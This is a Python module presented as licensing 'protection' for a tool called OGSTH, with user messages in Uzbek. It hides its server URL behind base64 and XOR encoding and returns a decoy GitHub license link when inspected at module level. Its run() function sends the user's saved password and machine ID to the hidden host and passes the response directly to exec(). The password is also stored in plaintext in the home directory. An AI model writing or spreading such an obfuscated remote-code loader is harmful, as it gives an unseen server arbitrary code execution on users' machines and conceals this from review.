# ====================== AT PROTECTION ======================

import hashlib, sys, os, requests, json, base64, inspect
from licensing.methods import Helpers
from colorama import Fore, Style


# ====================== CONFIG ======================

CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".ogsth")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")


# ---------------- PASSWORD SYSTEM ----------------

def load_password():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f).get("password", "")
        except:
            return ""
    return ""

def save_password(pw: str):
    os.makedirs(CONFIG_DIR, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump({"password": pw}, f)


# ---------------- MACHINE CODE ----------------

machine_code = Helpers.GetMachineCode(v=2)


# ---------------- SELF HASH CHECK ----------------

def geturl(enc):
    stack = inspect.stack()
    if len(stack) > 1 and stack[1].function == '<module>':
        return base64.b64decode(
            "aHR0cHM6Ly9naXRodWIuY29tL0Fha2FzaEt1bWFyTmFpbi9DYXB0Y2hhQ3JhY2tlci9ibG9iL21hc3Rlci9MSUNFU05FLm1k"
        ).decode()

    key = 0x42
    return "".join(chr(ord(c) ^ key) for c in enc)


ENC_URL = "".join(
    chr(ord(c) ^ 0x42)
    for c in base64.b64decode(
        "aHR0cHM6Ly9uZXcudTExMjQwLnh2ZXN0My5ydS9EZXZpY2UvMi4wL2dldGNvZGVyLnBocA=="
    ).decode()
)


# ====================== MAIN RUNTIME ======================

def get_password():
    pw = load_password()
    if pw:
        return pw

    pw = input(f"{Fore.YELLOW}Parolni kiriting: {Style.RESET_ALL}")
    save_password(pw)
    return pw


# ====================== PUBLIC API ======================
# This function is what users call: ismoiloff.run("001b")

def run(code_value: str):
    """Main function for executing OGSTH remote code."""

    password = get_password()

    headers = {'Authorization': 'true'}

    response = requests.get(
    geturl(ENC_URL) + f"?pass={password}&device={machine_code}&code={code_value}",
    headers=headers
)


    if response.status_code != 200:
        print("Kodni yuklab olishda xatolik yuz berdi:", response.status_code)
        return

    code = response.text

    if code == "2":
        print(f"{Fore.LIGHTRED_EX}Siz bu kodimizni ishlatishdan BAN olgansiz!\n@ismoiloff_S ga murojaat qiling {Style.RESET_ALL}")
    elif code == "0":
        print(f"{Fore.LIGHTRED_EX}No'malum device! \n@ismoiloff_S ga murojaat qiling {Style.RESET_ALL}")
    else:
        exec(code)